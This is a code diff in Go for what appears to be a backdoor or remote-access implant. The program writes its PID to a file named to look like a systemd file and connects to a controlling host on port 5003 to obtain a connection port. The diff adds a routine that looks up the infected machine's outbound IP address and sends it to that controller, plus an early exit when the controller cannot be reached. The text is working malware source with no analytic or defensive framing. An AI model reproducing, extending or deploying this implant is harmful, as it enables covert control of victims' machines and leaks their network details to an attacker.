@@ -32,6 +32,9 @@ func main() {
 	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
 	HOST_CONNECT = GetIP() + ":"
 	connectPort := GetPort()
+	if connectPort == "-1" {
+		return
+	}
 	EstablishConnection(connectPort)
 }
 
@@ -62,9 +65,11 @@ func GetPort() string {
 	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
 	if err != nil {
 		fmt.Println("Couldn't get connection")
-		return "420"
+		return "-1"
 	}
 	defer getPort.Close()
+	ip := GetOutboundIP()
+	getPort.Write([]byte(ip))
 	port, _ := bufio.NewReader(getPort).ReadString('\n')
 	return port
 }
@@ -119,4 +124,19 @@ func FindProcess() bool {
 	fmt.Printf("PID: " + pid)
 	pidint, _ := strconv.Atoi(pid)
 	return CheckPid(pidint)
+}
+
+func GetOutboundIP() string {
+	//Dial a connection to a WAN IP to get the box's correct IP address.
+	//Note that this doesn't actually establish a connection,
+	//but simply pretends to setup one. This is enough to get us the IP
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		return "none"
+	}
+	defer conn.Close()
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	ip := localAddr.IP
+	ipstr := ip.String()
+	return ipstr
 }
